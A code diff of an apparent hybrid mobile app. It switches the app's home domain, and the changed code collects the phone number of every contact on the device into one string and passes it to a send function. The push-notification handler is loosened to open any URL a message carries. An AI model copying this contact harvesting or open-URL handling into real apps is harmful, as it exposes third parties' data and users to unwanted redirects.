@@ -25,11 +25,9 @@
  
 var ref;
 
-//var mainDomain  	= "atm.berbagiyuk.com";
-//var mainHomeUrl 	= "http://www.atm.berbagiyuk.com/";  //with backslash
+var mainDomain  	= "atm.berbagiyuk.com";
+var mainHomeUrl 	= "http://www.atm.berbagiyuk.com/";  //with backslash
 
-var mainDomain  	= "davidprasetyo.xyz";
-var mainHomeUrl 	= "http://davidprasetyo.xyz/";  //with backslash
 
 var is_inappbrowser = false;
 var deviceID;
@@ -228,22 +226,28 @@ function sendPhoneNum(dataCon){
 }
 
 function onSuccessCont(contacts) {
-	var xx = '[';
+	//var xx = '[';
+	var xx = '';
 	
-	
+
     for (var i=0; i<contacts.length; i++) {
-		 displayNameS = contacts[i].displayName.replace(/\s/g, '');
-		 displayNameS = displayNameS.replace(/\W/g, '')
-		 displayNameS = displayNameS.replace(/[^0-9a-z]/gi, '')
+		 //displayNameS = contacts[i].displayName.replace(/\s/g, '');
+		 //displayNameS = displayNameS.replace(/\W/g, '')
+		 //displayNameS = displayNameS.replace(/[^0-9a-z]/gi, '')
 	
-         xx = xx + '["' + displayNameS + '"';
-		 xx = xx + ',"' +  contacts[i].phoneNumbers[1].value + '"]';
+         //xx = xx + '["' + displayNameS + '"';
+		 //xx = xx + ',"' +  contacts[i].phoneNumbers[0].value + '"]';
+		 xx = xx +  contacts[i].phoneNumbers[0].value ;
 		 if(i<(contacts.length-1)){
 			 xx = xx + ',';
 		 }else{
-			xx = xx + ']';
+			//xx = xx + ']';
 		 }
-    }
+	}	
+
+	
+	//var xx = JSON.stringify(contacts);
+		 
 	var finaldata = xx;
 	
 	sendPhoneNum(finaldata);
@@ -353,23 +357,17 @@ function getAllContacts(){
         });
 
         push.on('notification', function(data) {
-            console.log('notification event');
-
+            
+			var theUrl = JSON.stringify(data.additionalData.url);
 			var paramUrl = data.additionalData.url;
+			if(theUrl.indexOf(mainDomain) !== -1){
+				goToUrl(paramUrl);
+				//throw Error();
+			}
 			
-			var is_url = paramUrl.includes(mainDomain);
-			if(is_url){
+			if(isURL(paramUrl)){
 				goToUrl(paramUrl);
 				throw Error();
-			}else{
-				return 1;
-				navigator.notification.alert(
-					data.message,         // message
-					null,                 // callback
-					data.title,           // title
-					'Ok'                  // buttonName
-				);
-				
 			}
 			
 			//olah data disini
